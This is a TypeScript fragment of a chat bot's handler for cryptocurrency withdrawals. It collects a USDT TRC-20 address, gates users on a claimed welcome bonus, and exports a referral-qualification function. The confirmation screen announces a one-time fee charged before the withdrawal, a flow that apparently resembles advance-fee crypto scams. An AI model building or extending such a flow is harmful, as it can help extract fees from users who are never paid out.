        kb([nav("wallet")]),
      );
      return;
    }
    await setUiState(u.id, { ...(u.ui_state as object), address });
    u.ui_state = { ...(u.ui_state as object), address };
    await renderScreen(
      u,
      `🔎 CHECK WITHDRAWAL\n\nAmount:  ${usd(
        st.amount ?? 0,
      )}\nNetwork: TRON (TRC-20)\nWallet:\n${address}\n\nCharge:  ${usd(
        s.service_fee,
      )} one-time — details next\n\n${LINE}\n⚠️ Confirm that this is a USDT TRC-20 address.`,
      kb([[{ text: "✅ CONFIRM WITHDRAWAL", data: "wdconfirm" }], nav("wallet")]),
    );
    return;
  }

  if (!u.bonus_claimed) {
    await welcomeScreen(u, s);
    return;
  }
  await route(u, s, COMMANDS[text.split(" ")[0] ?? ""] ?? "home");
}

export { qualifyReferral };
